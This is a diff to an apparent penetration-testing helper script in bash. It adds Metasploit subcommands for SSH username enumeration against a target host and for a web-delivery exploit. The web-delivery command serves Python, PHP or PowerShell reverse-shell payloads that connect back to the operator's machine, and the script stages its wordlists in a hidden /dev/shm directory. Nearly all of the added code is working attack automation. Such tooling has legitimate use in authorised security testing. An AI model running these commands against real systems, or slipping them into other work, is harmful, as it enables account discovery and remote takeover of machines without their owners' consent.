@@ -1,4 +1,68 @@
-## msf [payload] [port]^: metasploit setp listener / generate payload
+## msf ssh(enum) [port] [wordlist]^: metasploit ssh user enumeration
+if [[ "$1" =~ ^msf$ ]] && [ "$#" -ge 2 ] && [[ "$2" =~ ^ssh(enum)?$ ]]; then
+  CMD="msfconsole"
+  export INSTCMD="apt install metasploit-framework -y"
+  checkCmd
+
+  PORT="22"
+  if [ "$#" -ge 3 ]; then
+    if [[ "$3" =~ ^[0-9]+$ ]]; then
+      PORT="$3"
+    else
+      echo "${warn} Port is not a number!"; exit
+    fi
+  fi
+
+  if [ "$#" -ge 4 ]; then
+    WORDLIST="$4"
+  else
+    createUserPassLists
+    FPATH="/dev/shm/.fxy"
+    WORDLIST="$FPATH/user.lst"
+  fi
+
+  CMD="msfconsole -x \"use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $RHOST; set RPORT $PORT; set CHECK_FALSE true; set USER_FILE $WORDLIST; run\""
+
+  echo "${bldwht}> $CMD${txtrst}"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## msf webdel(ivery) [lport] [py|php|psh]^: metasploit web delivery exploit
+if [[ "$1" =~ ^msf$ ]] && [ "$#" -ge 2 ] && [[ "$2" =~ ^webdel(ivery)?$ ]]; then
+  CMD="msfconsole"
+  export INSTCMD="apt install metasploit-framework -y"
+  checkCmd
+
+  PORT="9001"
+  if [ "$#" -ge 3 ]; then
+    if [[ "$3" =~ ^[0-9]+$ ]]; then
+      PORT="$3"
+    else
+      echo "${warn} Port is not a number!"; exit
+    fi
+  fi
+
+  PAYLOAD="windows/powershell_reverse_tcp";
+  TARGET="2"
+  if [ "$#" -ge 4 ]; then
+    case "$4" in
+      "py")     PAYLOAD="python/meterpreter/reverse_tcp"; TARGET="0";;
+      "php")    PAYLOAD="php/meterpreter/reverse_tcp";    TARGET="1";;
+      "psh"|*)  PAYLOAD="windows/powershell_reverse_tcp"; TARGET="2";;
+    esac
+  fi
+
+  CMD="msfconsole -x \"use exploit/multi/script/web_delivery; set LHOST $(getIP); set LPORT $PORT; set PAYLOAD $PAYLOAD; set TARGET $TARGET; run\""
+
+  echo "${bldwht}> $CMD${txtrst}"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## msf [payload] [port] [gen(erate)] [format]^: metasploit setup listener / generate payload
 if [[ "$1" =~ ^msf$ ]]; then
   CMD="msfconsole"
   export INSTCMD="apt install metasploit-framework -y"
